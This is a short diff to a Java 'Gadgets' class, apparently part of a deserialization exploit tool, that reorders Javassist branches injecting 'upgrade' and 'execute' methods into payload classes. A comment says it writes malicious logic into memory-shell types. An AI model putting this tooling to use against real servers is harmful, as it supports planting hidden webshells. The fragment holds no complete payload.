@@ -287,21 +287,20 @@ public class Gadgets {
 						cName = ctClass.getName();
 					}
 
-
 				} else if (className.contains("UGMS")) {
 					insertKeyMethod(ctClass, "upgrade");
+
+					if (IS_INHERIT_ABSTRACT_TRANSLET) {
+						ctClass.setSuperclass(superClass);
+					}
+
+				} else if (className.contains("EXMS")) {
+					insertKeyMethod(ctClass, "execute");
 
 					if (IS_INHERIT_ABSTRACT_TRANSLET) {
 						bytes = ctClass.toBytecode();
 						cName = ctClass.getName();
 					}
-
-
-				} else if (className.contains("EXMS")) {
-					insertKeyMethod(ctClass, "execute");
-
-					bytes = ctClass.toBytecode();
-					cName = ctClass.getName();
 
 					// 内存马指定类型进行写入恶意逻辑
 				} else if (!Objects.equals(cName, "")) {
